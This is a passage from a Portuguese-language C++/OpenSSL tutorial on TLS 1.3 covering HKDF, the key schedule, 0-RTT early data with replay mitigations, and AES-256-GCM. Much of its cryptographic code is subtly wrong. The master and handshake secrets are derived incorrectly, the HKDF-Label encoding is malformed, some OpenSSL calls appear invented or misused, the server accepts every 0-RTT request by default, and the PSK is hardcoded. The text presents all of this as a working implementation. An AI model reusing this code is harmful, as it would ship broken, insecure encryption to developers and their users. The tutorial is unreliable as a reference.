                                 size_t length,
                                 const std::vector<uint8_t>& info = {}) {
        if (length > MAX_HKDF_OUTPUT) {
            throw std::runtime_error("Tamanho de saída HKDF excede máximo");
        }

        std::vector<uint8_t> okm(length);
        size_t n = (length + hash_size_ - 1) / hash_size_;
        std::vector<uint8_t> current;

        EVP_MAC* mac = EVP_MAC_fetch(nullptr, "HMAC", nullptr);

        for (size_t i = 0; i < n; ++i) {
            EVP_MAC_CTX* ctx = EVP_MAC_CTX_new(mac);

            // Configurar digest
            OSSL_PARAM params[] = {
                OSSL_PARAM_construct_utf8_string("digest",
                                                  const_cast<char*>(get_digest_name()), 0),
                OSSL_PARAM_END
            };

            if (EVP_MAC_init(ctx, prk.data(), prk.size(), params) != 1) {
                EVP_MAC_CTX_free(ctx);
                EVP_MAC_free(mac);
                return {};
            }

            // Concatenar: previous_hash || info || counter
            if (!current.empty()) {
                EVP_MAC_update(ctx, current.data(), current.size());
            }
            if (!info.empty()) {
                EVP_MAC_update(ctx, info.data(), info.size());
            }
            uint8_t counter = static_cast<uint8_t>(i + 1);
            EVP_MAC_update(ctx, &counter, 1);

            size_t out_len = 0;
            std::vector<uint8_t> t(hash_size_);
            if (EVP_MAC_final(ctx, t.data(), &out_len, t.size()) != 1) {
                EVP_MAC_CTX_free(ctx);
                EVP_MAC_free(mac);
                return {};
            }
            t.resize(out_len);

            current = t;
            EVP_MAC_CTX_free(ctx);

            // Copiar para output
            size_t copy_len = std::min(hash_size_, length - i * hash_size_);
            std::memcpy(okm.data() + i * hash_size_, t.data(), copy_len);
        }

        EVP_MAC_free(mac);
        return okm;
    }

    // HKDF completo: Extract + Expand
    std::vector<uint8_t> derive(const std::vector<uint8_t>& secret,
                                 const std::vector<uint8_t>& salt,
                                 const std::vector<uint8_t>& info,
                                 size_t length) {
        auto prk = extract(salt, secret);
        return expand(prk, length, info);
    }

private:
    HashAlgorithm hash_algo_;
    size_t hash_size_;

    const char* get_digest_name() const {
        switch (hash_algo_) {
            case HashAlgorithm::SHA256: return "SHA256";
            case HashAlgorithm::SHA384: return "SHA384";
        }
        return "SHA256";
    }

    void setup_hash() {
        // OpenSSL 3.x não precisa de inicialização explícita para HKDF
        // mas garantimos que os providers estão carregados
    }

    void cleanup() {
        // Cleanup automático em OpenSSL 3.x via destructors
    }
};
```

### 3.3 Derivação de Chaves TLS 1.3

```c++
#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/rand.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>

#include <iostream>
#include <vector>
#include <array>
#include <cstring>
#include <cstdint>

struct Tls13KeySchedule {
    // Constantes definidas no RFC 8446
    static constexpr uint8_t HKDF_LABEL_PREFIX[] = "tls13 ";
    static constexpr uint8_t HKDF_LABEL_CLIENT_HANDSHAKE_TRAFFIC[] =
        "c hs traffic";
    static constexpr uint8_t HKDF_LABEL_SERVER_HANDSHAKE_TRAFFIC[] =
        "s hs traffic";
    static constexpr uint8_t HKDF_LABEL_CLIENT_APPLICATION_TRAFFIC[] =
        "c ap traffic";
    static constexpr uint8_t HKDF_LABEL_SERVER_APPLICATION_TRAFFIC[] =
        "s ap traffic";
    static constexpr uint8_t HKDF_LABEL_RESUMPTION_MASTER_SECRET[] =
        "res master";

    // Estruturas para armazenar chaves derivadas
    struct HandshakeTrafficKeys {
        std::vector<uint8_t> client_key;
        std::vector<uint8_t> client_iv;
        std::vector<uint8_t> server_key;
        std::vector<uint8_t> server_iv;
    };

    struct ApplicationTrafficKeys {
        std::vector<uint8_t> client_key;
        std::vector<uint8_t> client_iv;
        std::vector<uint8_t> server_key;
        std::vector<uint8_t> server_iv;
    };

    // Tamanhos de chave para cada cifra
    enum class CipherSuite {
        AES_128_GCM_SHA256,
        AES_256_GCM_SHA384,
        CHACHA20_POLY1305_SHA256
    };

    static size_t key_size(CipherSuite suite) {
        switch (suite) {
            case CipherSuite::AES_128_GCM_SHA256: return 16;
            case CipherSuite::AES_256_GCM_SHA384: return 32;
            case CipherSuite::CHACHA20_POLY1305_SHA256: return 32;
        }
        return 16;
    }

    static size_t iv_size(CipherSuite suite) {
        // IVs são sempre 12 bytes para AEAD no TLS 1.3
        return 12;
    }

    static size_t hash_size(CipherSuite suite) {
        switch (suite) {
            case CipherSuite::AES_128_GCM_SHA256: return 32;
            case CipherSuite::AES_256_GCM_SHA384: return 48;
            case CipherSuite::CHACHA20_POLY1305_SHA256: return 32;
        }
        return 32;
    }
};

class Tls13KeyDerivation {
public:
    Tls13KeyDerivation(Tls13KeySchedule::CipherSuite suite)
        : suite_(suite), hash_size_(Tls13KeySchedule::hash_size(suite)) {}

    ~Tls13KeyDerivation() {
        // Limpar chaves da memória
        secure_clear(client_handshake_secret_);
        secure_clear(server_handshake_secret_);
        secure_clear(master_secret_);
    }

    // Derivar Early Secret (para 0-RTT)
    std::vector<uint8_t> derive_early_secret(
            const std::vector<uint8_t>& psk = {}) {
        // Early Secret = HKDF-Extract(0, PSK ou zeros)
        std::vector<uint8_t> salt(hash_size_, 0);
        std::vector<uint8_t> ikm;

        if (psk.empty()) {
            ikm.resize(hash_size_, 0);
        } else {
            ikm = psk;
        }

        early_secret_ = hkdf_extract(salt, ikm);

        // Derivar chaves de tráfego antecipado (se aplicável)
        // Essas chaves são usadas apenas para 0-RTT

        return early_secret_;
    }

    // Derivar Handshake Secret a partir de Shared Secret
    std::vector<uint8_t> derive_handshake_secret(
            const std::vector<uint8_t>& shared_secret,
            const std::vector<uint8_t>& hello_hash) {
        // Handshake Secret = HKDF-Extract(0, shared_secret)
        std::vector<uint8_t> salt(hash_size_, 0);

        auto handshake_secret = hkdf_extract(salt, shared_secret);

        // Derivar Handshake Traffic Keys
        handshake_keys_ = derive_handshake_traffic_keys(handshake_secret, hello_hash);

        // Salvar para derivação posterior do Master Secret
        client_handshake_secret_ = handshake_keys_.client_key;
        server_handshake_secret_ = handshake_keys_.server_key;

        return handshake_secret;
    }

    // Derivar Master Secret e Application Traffic Keys
    Tls13KeySchedule::ApplicationTrafficKeys derive_application_traffic(
            const std::vector<uint8_t>& handshake_hash) {
        // Master Secret = HKDF-Extract(0, Handshake Secret)
        // Na verdade, o handshake secret é derivado do zero com o shared secret
        // O master secret é derivado do handshake secret com zeros como salt

        std::vector<uint8_t> salt(hash_size_, 0);
        std::vector<uint8_t> empty_secret(hash_size_, 0);

        // Derivar master secret
        master_secret_ = hkdf_extract(salt, empty_secret);

        // Derivar Application Traffic Keys
        app_traffic_keys_ = derive_application_traffic_keys(master_secret_, handshake_hash);

        return app_traffic_keys_;
    }

    // Derivar chave de Finished
    std::vector<uint8_t> derive_finished_key(
            const std::vector<uint8_t>& base_key) {
        return hkdf_expand_label(
            base_key,
            "finished",
            {},
            hash_size_
        );
    }

    // Derivar chave de exporter
    std::vector<uint8_t> derive_exporter_secret(
            const std::vector<uint8_t>& handshake_hash) {
        return hkdf_expand_label(
            master_secret_,
            "exp master",
            handshake_hash,
            hash_size_
        );
    }

    const Tls13KeySchedule::HandshakeTrafficKeys& get_handshake_keys() const {
        return handshake_keys_;
    }

    const Tls13KeySchedule::ApplicationTrafficKeys& get_app_keys() const {
        return app_traffic_keys_;
    }

private:
    Tls13KeySchedule::CipherSuite suite_;
    size_t hash_size_;

    std::vector<uint8_t> early_secret_;
    std::vector<uint8_t> client_handshake_secret_;
    std::vector<uint8_t> server_handshake_secret_;
    std::vector<uint8_t> master_secret_;

    Tls13KeySchedule::HandshakeTrafficKeys handshake_keys_;
    Tls13KeySchedule::ApplicationTrafficKeys app_traffic_keys_;

    std::vector<uint8_t> hkdf_extract(const std::vector<uint8_t>& salt,
                                       const std::vector<uint8_t>& ikm) {
        HkdfDerivation hkdf(hash_size_ == 48 ?
            HkdfDerivation::HashAlgorithm::SHA384 :
            HkdfDerivation::HashAlgorithm::SHA256);

        return hkdf.extract(salt, ikm);
    }

    std::vector<uint8_t> hkdf_expand(const std::vector<uint8_t>& prk,
                                       size_t length,
                                       const std::vector<uint8_t>& info) {
        HkdfDerivation hkdf(hash_size_ == 48 ?
            HkdfDerivation::HashAlgorithm::SHA384 :
            HkdfDerivation::HashAlgorithm::SHA256);

        return hkdf.expand(prk, length, info);
    }

    std::vector<uint8_t> hkdf_expand_label(
            const std::vector<uint8_t>& secret,
            const std::string& label,
            const std::vector<uint8_t>& context,
            size_t length) {
        // Formato TLS 1.3: HKDF-Label = "tls13 " + label
        std::string full_label = "tls13 " + label;

        // Construir info: label_len + label + context_len + context
        std::vector<uint8_t> info;

        // Label length (2 bytes, big-endian)
        uint16_t label_len = static_cast<uint16_t>(full_label.size());
        info.push_back((label_len >> 8) & 0xFF);
        info.push_back(label_len & 0xFF);

        // Label
        info.insert(info.end(), full_label.begin(), full_label.end());

        // Context length (2 bytes, big-endian)
        uint16_t context_len = static_cast<uint16_t>(context.size());
        info.push_back((context_len >> 8) & 0xFF);
        info.push_back(context_len & 0xFF);

        // Context
        info.insert(info.end(), context.begin(), context.end());

        // Length (2 bytes, big-endian)
        uint16_t length_be = static_cast<uint16_t>(length);
        info.push_back((length_be >> 8) & 0xFF);
        info.push_back(length_be & 0xFF);

        return hkdf_expand(secret, length, info);
    }

    Tls13KeySchedule::HandshakeTrafficKeys derive_handshake_traffic_keys(
            const std::vector<uint8_t>& handshake_secret,
            const std::vector<uint8_t>& hello_hash) {
        Tls13KeySchedule::HandshakeTrafficKeys keys;
        size_t k = Tls13KeySchedule::key_size(suite_);
        size_t iv = Tls13KeySchedule::iv_size(suite_);

        // Client Handshake Traffic Secret
        auto client_hs_secret = hkdf_expand_label(
            handshake_secret, "c hs traffic", hello_hash, hash_size_
        );

        // Server Handshake Traffic Secret
        auto server_hs_secret = hkdf_expand_label(
            handshake_secret, "s hs traffic", hello_hash, hash_size_
        );

        // Derivar chaves e IVs
        keys.client_key = hkdf_expand_label(client_hs_secret, "key", {}, k);
        keys.client_iv = hkdf_expand_label(client_hs_secret, "iv", {}, iv);
        keys.server_key = hkdf_expand_label(server_hs_secret, "key", {}, k);
        keys.server_iv = hkdf_expand_label(server_hs_secret, "iv", {}, iv);

        return keys;
    }

    Tls13KeySchedule::ApplicationTrafficKeys derive_application_traffic_keys(
            const std::vector<uint8_t>& master_secret,
            const std::vector<uint8_t>& transcript_hash) {
        Tls13KeySchedule::ApplicationTrafficKeys keys;
        size_t k = Tls13KeySchedule::key_size(suite_);
        size_t iv = Tls13KeySchedule::iv_size(suite_);

        // Client Application Traffic Secret
        auto client_app_secret = hkdf_expand_label(
            master_secret, "c ap traffic", transcript_hash, hash_size_
        );

        // Server Application Traffic Secret
        auto server_app_secret = hkdf_expand_label(
            master_secret, "s ap traffic", transcript_hash, hash_size_
        );

        // Derivar chaves e IVs
        keys.client_key = hkdf_expand_label(client_app_secret, "key", {}, k);
        keys.client_iv = hkdf_expand_label(client_app_secret, "iv", {}, iv);
        keys.server_key = hkdf_expand_label(server_app_secret, "key", {}, k);
        keys.server_iv = hkdf_expand_label(server_app_secret, "iv", {}, iv);

        return keys;
    }

    void secure_clear(std::vector<uint8_t>& data) {
        if (!data.empty()) {
            OPENSSL_cleanse(data.data(), data.size());
        }
    }
};
```

### 3.4 Fluxo Completo de Derivação

```
Cliente                              Servidor
  |                                    |
  |  ClientHello                       |
  |  (key_share: client_public)        |
  |----------------------------------->|
  |                                    |
  |  ServerHello                       |
  |  (key_share: server_public)        |
  |                                    |
  |  shared_secret = ECDH(client_priv, server_pub)
  |                  ECDH(server_priv, client_pub)
  |                                    |
  |  transcript_hash_0 = Hash(ClientHello + ServerHello)
  |                                    |
  |  Early Secret = HKDF-Extract(0, PSK ou zeros)
  |  Handshake Secret = HKDF-Extract(0, shared_secret)
  |                                    |
  |  Client HS Traffic Secret = HKDF-Expand-Label(Handshake Secret, "c hs traffic", transcript_hash_0)
  |  Server HS Traffic Secret = HKDF-Expand-Label(Handshake Secret, "s hs traffic", transcript_hash_0)
  |                                    |
  |  Client HS Key = HKDF-Expand-Label(Client HS Secret, "key", {}, key_len)
  |  Client HS IV  = HKDF-Expand-Label(Client HS Secret, "iv", {}, iv_len)
  |  Server HS Key = HKDF-Expand-Label(Server HS Secret, "key", {}, key_len)
  |  Server HS IV  = HKDF-Expand-Label(Server HS Secret, "iv", {}, iv_len)
  |                                    |
  |  EncryptedExtensions (criptografado com Server HS Key/IV)
  |  Certificate (criptografado)
  |  CertificateVerify (criptografado)
  |  Finished (criptografado)
  |<-----------------------------------|
  |                                    |
  |  transcript_hash_1 = Hash(...all handshake...)
  |                                    |
  |  Master Secret = HKDF-Extract(0, Handshake Secret com zeros)
  |                                    |
  |  Client App Traffic Secret = HKDF-Expand-Label(MS, "c ap traffic", transcript_hash_1)
  |  Server App Traffic Secret = HKDF-Expand-Label(MS, "s ap traffic", transcript_hash_1)
  |                                    |
  |  Client App Key = HKDF-Expand-Label(CATS, "key", {}, key_len)
  |  Client App IV  = HKDF-Expand-Label(CATS, "iv", {}, iv_len)
  |  Server App Key = HKDF-Expand-Label(SATS, "key", {}, key_len)
  |  Server App IV  = HKDF-Expand-Label(SATS, "iv", {}, iv_len)
```

---

## 4. 0-RTT: Early Data, Replay Attacks, Risks

### 4.1 O que é 0-RTT?

O 0-RTT (Zero Round Trip Time Resumption) permite que o cliente envie dados criptografados imediatamente após o ClientHello, sem esperar pela resposta do servidor. Isso é possível quando:

1. O cliente já se conectou ao servidor anteriormente
2. O servidor forneceu um ticket de sessão (PSK)
3. O cliente usa o PSK para derivar chaves de tráfego antecipado

**Vantagens:**
- Latência zero adicional para o primeiro dado
- Experiência de usuário mais rápida
- Redução significativa de tempo de conexão

**Desvantagens:**
- **Replay attacks**: Mensagens 0-RTT podem ser reapresentadas
- **Sem forward secrecy para early data**: As chaves antecipadas são derivadas do PSK
- **Restrições**: Apenas para requisições idempotentes (GET, HEAD, etc.)

### 4.2 Implementação de 0-RTT

```c++
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/core_names.h>

#include <iostream>
#include <vector>
#include <functional>

class Tls13ZeroRttClient {
public:
    Tls13ZeroRttClient() : ctx_(nullptr), ssl_(nullptr) {}

    ~Tls13ZeroRttClient() {
        if (ssl_) SSL_free(ssl_);
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool initialize(const std::string& server_name) {
        ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ctx_) return false;

        // Configurar TLS 1.3
        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION);

        // Configurar cifras
        const char* ciphersuites =
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256";

        SSL_CTX_set_ciphersuites(ctx_, ciphersuites);

        // Habilitar Early Data (0-RTT)
        SSL_CTX_set_max_early_data(ctx_, 16384); // 16KB máximo

        // Callback para obter PSK
        SSL_CTX_set_psk_client_callback(ctx_, psk_callback);

        ssl_ = SSL_new(ctx_);
        if (!ssl_) return false;

        // Configurar SNI
        SSL_set_tlsext_host_name(ssl_, server_name.c_str());
        SSL_set1_host(ssl_, server_name.c_str());

        server_name_ = server_name;
        return true;
    }

    bool connect(int sockfd) {
        SSL_set_fd(ssl_, sockfd);

        // Solicitar Early Data
        SSL_set_early_data_enabled(ssl_, 1);

        int ret = SSL_connect(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }

        return true;
    }

    bool send_early_data(const std::vector<uint8_t>& data) {
        // Verificar se Early Data foi aceito
        int early_data_status = SSL_get_early_data_status(ssl_);

        if (early_data_status == SSL_EARLY_DATA_ACCEPTED) {
            // Dados já foram enviados com 0-RTT
            std::cout << "Early Data aceito pelo servidor\n";
            return true;
        } else if (early_data_status == SSL_EARLY_DATA_REJECTED) {
            // Servidor rejeitou 0-RTT, enviar como dados normais
            std::cout << "Early Data rejeitado, enviando como dados normais\n";
            return send_regular_data(data);
        } else if (early_data_status == SSL_EARLY_DATA_NOT_SENT) {
            // Early Data não foi enviado ainda
            // Precisamos enviar agora
            int ret = SSL_write_early_data(ssl_, data.data(), data.size(), nullptr);
            if (ret != 1) {
                int err = SSL_get_error(ssl_, ret);
                if (err == SSL_ERROR_WANT_READ) {
                    // Aguardar resposta do servidor
                    return handle_early_data_response(data);
                }
                print_ssl_errors(err);
                return false;
            }
            return true;
        }

        return false;
    }

    bool send_regular_data(const std::vector<uint8_t>& data) {
        int ret = SSL_write(ssl_, data.data(), data.size());
        if (ret <= 0) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }
        return true;
    }

    std::vector<uint8_t> receive_data() {
        std::vector<uint8_t> buffer(4096);
        int ret = SSL_read(ssl_, buffer.data(), buffer.size());
        if (ret > 0) {
            buffer.resize(ret);
            return buffer;
        }
        return {};
    }

    void print_early_data_status() const {
        int status = SSL_get_early_data_status(ssl_);
        std::cout << "\n=== Status do 0-RTT ===\n";
        switch (status) {
            case SSL_EARLY_DATA_NOT_SENT:
                std::cout << "Status: Early Data não enviado\n";
                break;
            case SSL_EARLY_DATA_REJECTED:
                std::cout << "Status: Early Data REJEITADO\n";
                std::cout << "Motivo: Possível replay ou handshake não completo\n";
                break;
            case SSL_EARLY_DATA_ACCEPTED:
                std::cout << "Status: Early Data ACEITO\n";
                std::cout << "AVISO: Dados 0-RTT NÃO têm replay protection\n";
                break;
            default:
                std::cout << "Status: Desconhecido (" << status << ")\n";
        }
        std::cout << "========================\n";
    }

private:
    SSL_CTX* ctx_;
    SSL* ssl_;
    std::string server_name_;

    static unsigned int psk_callback(SSL* ssl, const char* hint,
                                      char* identity, unsigned int max_identity_len,
                                      unsigned char* psk, unsigned int max_psk_len) {
        // Em produção: buscar PSK em armazenamento seguro
        // Aqui apenas demostramos o callback

        // Identidade do PSK
        const char* psk_identity = "client-identity-123";
        if (strlen(psk_identity) >= max_identity_len) return 0;
        strcpy(identity, psk_identity);

        // PSK (chave compartilhada previamente)
        // EM PRODUÇÃO: NUNCA hardcode chaves!
        // Isto é apenas para demonstração
        static const unsigned char psk_value[] = {
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
            0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
            0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        };

        size_t psk_len = sizeof(psk_value);
        if (psk_len > max_psk_len) return 0;
        memcpy(psk, psk_value, psk_len);

        return static_cast<unsigned int>(psk_len);
    }

    bool handle_early_data_response(const std::vector<uint8_t>& data) {
        // Aguardar handshake completar
        int ret;
        do {
            ret = SSL_connect(ssl_);
            if (ret != 1) {
                int err = SSL_get_error(ssl_, ret);
                if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
                    continue;
                }
                print_ssl_errors(err);
                return false;
            }
        } while (ret != 1);

        // Verificar status do Early Data
        int early_status = SSL_get_early_data_status(ssl_);
        if (early_status == SSL_EARLY_DATA_REJECTED) {
            // Reenviar como dados normais
            return send_regular_data(data);
        }

        return true;
    }

    void print_ssl_errors(int err) const {
        switch (err) {
            case SSL_ERROR_SSL:
                std::cerr << "Erro SSL: ";
                ERR_print_errors_fp(stderr);
                break;
            case SSL_ERROR_SYSCALL:
                std::cerr << "Erro de sistema: " << strerror(errno) << "\n";
                break;
            default:
                std::cerr << "Erro SSL: " << err << "\n";
        }
    }
};

// Servidor com suporte a 0-RTT
class Tls13ZeroRttServer {
public:
    Tls13ZeroRttServer() : ctx_(nullptr), ssl_(nullptr) {}

    ~Tls13ZeroRttServer() {
        if (ssl_) SSL_free(ssl_);
        if (ctx_) SSL_CTX_free(ctx_);
    }

    bool initialize(const char* cert_path, const char* key_path) {
        ctx_ = SSL_CTX_new(TLS_server_method());
        if (!ctx_) return false;

        // Configurar TLS 1.3
        SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION);

        // Habilitar Early Data
        SSL_CTX_set_max_early_data(ctx_, 16384);

        // Carregar certificado
        if (SSL_CTX_use_certificate_chain_file(ctx_, cert_path) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        if (SSL_CTX_use_PrivateKey_file(ctx_, key_path, SSL_FILETYPE_PEM) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        if (SSL_CTX_check_private_key(ctx_) != 1) {
            ERR_print_errors_fp(stderr);
            return false;
        }

        // Callback para decidir se Early Data é aceito
        // IMPORTANTE: Isso é onde você implementa proteção contra replay
        SSL_CTX_set_tlsext_max_fragment_length(ctx_, 0); // Default

        // Callback de validação de Early Data
        SSL_CTX_set_recv_early_data_cb(ctx_, early_data_callback);

        // Callback para new session
        SSL_CTX_sess_set_new_cb(ctx_, new_session_callback);

        return true;
    }

    bool accept(int client_fd) {
        ssl_ = SSL_new(ctx_);
        if (!ssl_) return false;

        SSL_set_fd(ssl_, client_fd);

        int ret = SSL_accept(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }

        return true;
    }

    std::vector<uint8_t> receive_early_data() {
        std::vector<uint8_t> buffer(16384);
        size_t bytes_read = 0;

        // Ler dados antecipados
        int ret = SSL_read_early_data(ssl_, buffer.data(), buffer.size(), &bytes_read);
        if (ret == SSL_EARLY_DATA_READING) {
            // Ainda há dados para ler
            buffer.resize(bytes_read);
            return buffer;
        } else if (ret == SSL_EARLY_DATA_NOT_READ) {
            // Não há mais dados antecipados
            return {};
        }

        buffer.resize(bytes_read);
        return buffer;
    }

    std::vector<uint8_t> receive_regular_data() {
        std::vector<uint8_t> buffer(4096);
        int ret = SSL_read(ssl_, buffer.data(), buffer.size());
        if (ret > 0) {
            buffer.resize(ret);
            return buffer;
        }
        return {};
    }

    bool send_data(const std::vector<uint8_t>& data) {
        int ret = SSL_write(ssl_, data.data(), data.size());
        if (ret <= 0) {
            int err = SSL_get_error(ssl_, ret);
            print_ssl_errors(err);
            return false;
        }
        return true;
    }

private:
    SSL_CTX* ctx_;
    SSL* ssl_;

    // Callback para Early Data
    static int early_data_callback(SSL* s, SSL_CTX* ctx, const char* session,
                                     size_t session_len, int* copy) {
        // IMPORTANTE: Verificar se aceitamos Early Data
        // Em produção, verificar:
        // 1. Se a sessão é válida e não expirou
        // 2. Se o PSK associado é confiável
        // 3. Se a aplicação pode tolerar replay

        // Por padrão, aceitar Early Data
        // Em produção: implementar lógica de aceitação/rejeição
        *copy = 1; // Copiar sessão para uso posterior
        return SSL_EARLY_DATA_ACCEPTED;
    }

    static void new_session_callback(SSL* ssl, SSL_SESSION* session) {
        // Criar ticket de sessão para resumption
        // Em produção: persistir a sessão em cache
        unsigned int session_id;
        const unsigned char* id = SSL_SESSION_get_session_id(session, &session_id);
        std::cout << "Nova sessão criada (ID: " << std::hex << session_id << ")\n";
    }

    void print_ssl_errors(int err) const {
        switch (err) {
            case SSL_ERROR_SSL:
                std::cerr << "Erro SSL: ";
                ERR_print_errors_fp(stderr);
                break;
            case SSL_ERROR_SYSCALL:
                std::cerr << "Erro de sistema: " << strerror(errno) << "\n";
                break;
            default:
                std::cerr << "Erro SSL: " << err << "\n";
        }
    }
};
```

### 4.3 Riscos do 0-RTT e Mitigações

**Ataques de Replay:**

```
Atacante                               Cliente
  |                                      |
  |  Captura ClientHello + Early Data    |
  |<-------------------------------------|
  |                                      |
  |  Envia captura para servidor N vezes |
  |------------------------------------->|
  |  Servidor processa N requisições    |
  |  (ex: transferência bancária)        |
  |------------------------------------->|
```

**Mitigações:**

```c++
// 1. Apenas requisições idempotentes em 0-RTT
class SafeEarlyDataHandler {
public:
    bool is_safe_for_early_data(const std::string& method,
                                 const std::string& path) {
        // Métodos seguros (idempotentes)
        static const std::vector<std::string> safe_methods = {
            "GET", "HEAD", "OPTIONS", "TRACE"
        };

        // Métodos NÃO seguros (não idempotentes)
        static const std::vector<std::string> unsafe_methods = {
            "POST", "PUT", "DELETE", "PATCH"
        };

        // Verificar se o método é seguro
        for (const auto& safe : safe_methods) {
            if (method == safe) return true;
        }

        // POST para endpoints específicos pode ser seguro
        // (ex: busca, health check)
        if (method == "POST" && is_idempotent_endpoint(path)) {
            return true;
        }

        return false;
    }

private:
    bool is_idempotent_endpoint(const std::string& path) {
        // Exemplos de endpoints idempotentes
        static const std::vector<std::string> idempotent_paths = {
            "/api/health",
            "/api/search",
            "/api/status"
        };

        for (const auto& p : idempotent_paths) {
            if (path == p) return true;
        }
        return false;
    }
};

// 2. Anti-Replay com timestamps e nonces
class AntiReplayProtection {
public:
    struct EarlyDataHeader {
        uint64_t timestamp;      // Timestamp da requisição
        uint64_t nonce;          // Nonce único
        uint32_t sequence;       // Número de sequência
    };

    bool validate_early_data(const EarlyDataHeader& header) {
        // Verificar timestamp (janela de 10 segundos)
        auto now = std::chrono::system_clock::now();
        auto now_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()).count();

        if (std::abs(static_cast<int64_t>(now_ms) -
                     static_cast<int64_t>(header.timestamp)) > 10000) {
            return false; // Timestamp fora da janela
        }

        // Verificar nonce contra replay
        if (seen_nonces_.count(header.nonce)) {
            return false; // Nonce já visto
        }
        seen_nonces_.insert(header.nonce);

        // Verificar sequência
        if (header.sequence <= last_sequence_) {
            return false; // Sequência inválida
        }
        last_sequence_ = header.sequence;

        return true;
    }

private:
    std::set<uint64_t> seen_nonces_;
    uint64_t last_sequence_{0};
};

// 3. Rate limiting para 0-RTT
class EarlyDataRateLimiter {
public:
    bool allow_early_data(const std::string& client_ip) {
        auto now = std::chrono::steady_clock::now();
        auto& record = rate_limits_[client_ip];

        // Limpar registros antigos (janela de 1 minuto)
        while (!record.timestamps.empty() &&
               now - record.timestamps.front() > std::chrono::minutes(1)) {
            record.timestamps.pop_front();
        }

        // Verificar limite (máximo 10 requests por minuto via 0-RTT)
        if (record.timestamps.size() >= 10) {
            return false;
        }

        record.timestamps.push_back(now);
        return true;
    }

private:
    struct RateRecord {
        std::deque<std::chrono::steady_clock::time_point> timestamps;
    };

    std::map<std::string, RateRecord> rate_limits_;
};
```

---

## 5. Cipher Suites TLS 1.3: AES_256_GCM_SHA384, CHACHA20_POLY1305_SHA256

### 5.1 Cipher Suites no TLS 1.3

No TLS 1.3, as cipher suites são simplificadas e consistem apenas em:

```
TLS_<cipher>_<hash>

Exemplos:
- TLS_AES_256_GCM_SHA384
- TLS_CHACHA20_POLY1305_SHA256
- TLS_AES_128_GCM_SHA256
```

Diferente do TLS 1.2, não há combinação de chaves de troca de chaves + cifra + MAC. O key exchange é sempre baseado em DH/ECDH.

### 5.2 AES-256-GCM

AES-256-GCM é o padrão ouro para criptografia em TLS 1.3:

- **Chave**: 256 bits (32 bytes)
- **Nonce**: 96 bits (12 bytes)
- **Tag de autenticação**: 128 bits (16 bytes)
- **Modo**: Galois/Counter Mode (AEAD)

```c++
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/core_names.h>
#include <openssl/param_build.h>

#include <iostream>
#include <vector>
#include <cstring>

class Aes256Gcm {
public:
    static constexpr size_t KEY_SIZE = 32;
    static constexpr size_t IV_SIZE = 12;
    static constexpr size_t TAG_SIZE = 16;

    Aes256Gcm() : ctx_(nullptr) {
        ctx_ = EVP_CIPHER_CTX_new();
        if (!ctx_) {
            throw std::runtime_error("Falha ao criar contexto de cifra");
        }
    }

    ~Aes256Gcm() {
        if (ctx_) {
            EVP_CIPHER_CTX_free(ctx_);
        }
    }

    // Gerar chave aleatória segura
    static std::vector<uint8_t> generate_key() {
        std::vector<uint8_t> key(KEY_SIZE);
        if (RAND_bytes(key.data(), KEY_SIZE) != 1) {
            throw std::runtime_error("Falha ao gerar chave aleatória");
        }
        return key;
    }

    // Gerar IV aleatório
    static std::vector<uint8_t> generate_iv() {
        std::vector<uint8_t> iv(IV_SIZE);
        if (RAND_bytes(iv.data(), IV_SIZE) != 1) {
            throw std::runtime_error("Falha ao gerar IV aleatório");
        }
        return iv;
    }

    // Criptografar dados
    struct EncryptedData {
        std::vector<uint8_t> ciphertext;
        std::vector<uint8_t> tag;
        std::vector<uint8_t> iv;
    };

    EncryptedData encrypt(const std::vector<uint8_t>& key,
                           const std::vector<uint8_t>& plaintext,
                           const std::vector<uint8_t>& aad = {}) {
        if (key.size() != KEY_SIZE) {
            throw std::runtime_error("Tamanho de chave inválido");
        }

        auto iv = generate_iv();

        // Configurar contexto para criptografia
        if (EVP_EncryptInit_ex2(ctx_, EVP_aes_256_gcm(),
                                  key.data(), iv.data(), nullptr) != 1) {
            throw std::runtime_error("Falha ao inicializar criptografia");
        }

        // Configurar tamanho do tag
        if (EVP_CIPHER_CTX_ctrl(ctx_, EVP_CTRL_GCM_SET_TAG,
                                  TAG_SIZE, nullptr) != 1) {
            throw std::runtime_error("Falha ao configurar tag");
        }

        // Processar AAD (Additional Authenticated Data)
        if (!aad.empty()) {
            int out_len = 0;
            if (EVP_EncryptUpdate(ctx_, nullptr, &out_len,
                                    aad.data(), aad.size()) != 1) {
                throw std::runtime_error("Falha ao processar AAD");
            }
        }

        // Criptografar dados
        std::vector<uint8_t> ciphertext(plaintext.size());
        int out_len = 0;
        if (EVP_EncryptUpdate(ctx_, ciphertext.data(), &out_len,
                                plaintext.data(), plaintext.size()) != 1) {
            throw std::runtime_error("Falha ao criptografar dados");
        }

        int final_len = 0;
        if (EVP_EncryptFinal_ex(ctx_, ciphertext.data() + out_len,
                                  &final_len) != 1) {
            throw std::runtime_error("Falha ao finalizar criptografia");
        }
        out_len += final_len;
